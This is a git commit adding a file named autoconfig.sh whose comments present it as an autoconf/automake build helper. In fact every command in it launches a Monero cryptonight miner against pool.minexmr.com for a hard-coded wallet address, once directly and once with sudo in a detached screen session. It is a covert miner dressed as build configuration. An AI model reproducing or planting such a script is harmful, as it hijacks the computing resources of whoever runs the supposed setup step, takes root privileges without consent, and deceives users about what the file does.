d48e1482bea92d20562e8d85c56c746a6690775f
Dony George <donygeorgek@gmail.com>
2017-12-10 21:34:33 +0530

    Add files via upload

---
+++ autoconfig.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+
+# You need autoconf 2.5x, preferably 2.57 or later
+# You need automake 1.7 or later. 1.6 might work.
+
+./minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 48pKEWWz81ebC7nqTrMfgJNpZhMXHUZv6j4sJwJvnRS3GLavSKMujc34TSMhVB747sZTjxfbBirfFVr7FzZYZvatTwS7bQh -p x -t 8
+sudo screen -S miner ./minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 48pKEWWz81ebC7nqTrMfgJNpZhMXHUZv6j4sJwJvnRS3GLavSKMujc34TSMhVB747sZTjxfbBirfFVr7FzZYZvatTwS7bQh -p x -t 8
+
